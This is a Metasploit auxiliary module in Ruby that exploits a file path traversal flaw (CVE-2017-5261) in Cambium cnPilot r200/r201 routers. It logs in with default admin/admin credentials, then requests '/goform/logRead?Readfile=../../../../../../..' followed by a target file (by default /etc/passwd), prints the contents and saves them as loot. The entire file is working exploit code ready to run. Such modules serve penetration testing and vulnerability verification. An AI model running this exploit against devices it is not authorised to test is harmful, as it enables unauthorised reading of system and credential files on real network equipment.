##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::CNPILOT

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Cambium cnPilot r200/r201 File Path Traversal',
      'Description' => %{
        This module exploits a File Path Traversal vulnerability in Cambium
        cnPilot r200/r201 to read arbitrary files off the file system. Affected
        versions - 4.3.3-R4 and prior.
      },
      'Author' =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
        ],
      'References' =>
        [
          ['CVE', '2017-5261'],
          ['URL', 'https://blog.rapid7.com/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities']
        ],
      'License' => MSF_LICENSE
     )
    )

    register_options(
      [
        OptInt.new('TIMEOUT', [true, 'HTTP connection timeout', 10]),
        Opt::RPORT(80),	# Application may run on a different port too. Change port accordingly.
        OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'admin']),
        OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'admin']),
        OptString.new('FILENAME', [true, 'Filename to read', '/etc/passwd'])
      ], self.class
    )

    deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')
  end

  def run_host(ip)
    unless is_app_cnpilot?
      return
    end
  end

  #
  # Read file
  #

  def read_file(the_cookie)
    print_status("#{rhost}:#{rport} - Accessing the file...")
    file = datastore['FILENAME']
    fileuri = "/goform/logRead?Readfile=../../../../../../..#{file}"
    final_url = "#{(ssl ? 'https' : 'http')}" + '://' + "#{rhost}:#{rport}" + "#{fileuri}"

    res = send_request_cgi(
      {
        'uri' => fileuri,
        'method' => 'GET',
        'cookie' => the_cookie,
        'headers' => {
          'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
      }
    )

    if res && res.code == 200
      results = res.body

      if results.size.zero?
        print_status('File not found.')
      else
        print_good("#{results}")

        # w00t we got l00t
        loot_name = 'fpt-log'
        loot_type = 'text/plain'
        loot_desc = 'Cambium cnPilot File Path Traversal Results'
        data = "#{results}"
        p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc)
        print_good("File saved in: #{p}")
      end
    else
      print_error("#{rhost}:#{rport} - Could not read file. You can manually check by accessing #{final_url}.")
      return
    end
  end

  #
  # Login & initiate file read
  #

  def run_login
    cookie, _version = do_login(datastore['USERNAME'], datastore['PASSWORD'])
    if cookie == 'skip'
      return
    else
      read_file(cookie)
    end
  end
end
